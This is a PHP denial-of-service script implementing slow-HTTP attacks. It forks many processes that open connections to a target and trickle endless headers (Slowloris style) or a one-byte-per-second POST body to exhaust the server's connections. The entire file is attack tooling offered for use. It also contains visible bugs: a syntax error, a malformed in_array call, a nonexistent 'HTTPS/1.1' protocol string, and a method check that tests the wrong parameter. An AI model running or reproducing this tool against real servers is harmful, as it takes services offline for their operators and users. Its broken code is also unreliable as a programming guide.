<?php


//<http|https://host> <port> <get or post> <number of processes> <time>";
function checkProto($host){
	$comps = (parse_url($host);
	if(in_array("http", $comps)){
		return "http";
	} elseif(in_array("https")){
		return "https";
	}
}

function attack_get($host,$port){
	if(checkProto($host) == "http"){
		$request  = "GET /".md5(rand())." HTTP/1.1\r\n";
	} elseif(checkProto($host) == "https"){
		$request  = "GET /".md5(rand())." HTTPS/1.1\r\n";
	} else{
		exit();
	}
	$request .= "Host: $host\r\n";
	$request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
	$request .= "Keep-Alive: 900\r\n";
	$request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
	$request .= "Accept: *.*\r\n";
	$request .= "X-a: " . rand(1, 10000) . "\r\n";

	$sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	@fwrite($sockfd, $request);

	while (true){
		if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")){
	   	    sleep(15);
	   	}else{
	   	    $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
		    @fwrite($sockfd, $request);
	   	}
	}
	
}

function attack_post($host,$port){
	if(checkProto($host) == "http"){
		$request  = "POST /".md5(rand())." HTTP/1.1\r\n";
	} elseif(checkProto($host) == "https"){
		$request  = "POST /".md5(rand())." HTTPS/1.1\r\n";
	}else{
		exit();
	}
	$request .= "Host: $host\r\n";
	$request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
	$request .= "Keep-Alive: 900\r\n";
	$request .= "Content-Length: 1000000000\r\n";
	$request .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$request .= "Accept: *.*\r\n";

	$sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	@fwrite($sockfd, $request);

	while (true){
		if (@fwrite($sockfd, ".") !== FALSE){
	   	    sleep(1);
	   	}else{
	   	    $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
		    @fwrite($sockfd, $request);
	   	}
	}
	
}

function main($params){
	$pids = array();
	$maxTime = time() + intval($params['time']);
	
	while(1){
		if (time() > $maxTime){
			foreach($pids as $pid){
				posix_kill($pid, 9);
				break;
			}
		}
		for ($i = 0; $i < $params['threads']; $i++){
		    $pid = pcntl_fork();
		    if ($pid == -1){
		        break;
		    }elseif($pid){
		        //parent process
	        	$pids[] = $pid;
		    }else{
			//child process
			if($params['method'] == 'post')
			{
				attack_post($params['host'], $params['port']);
			}elseif($params['threads'] == 'get') {
				attack_get($params['host'], $params['port']);
			}else{
				exit();
			}
	        	exit(0);
		    }
		}
	}

}
?>
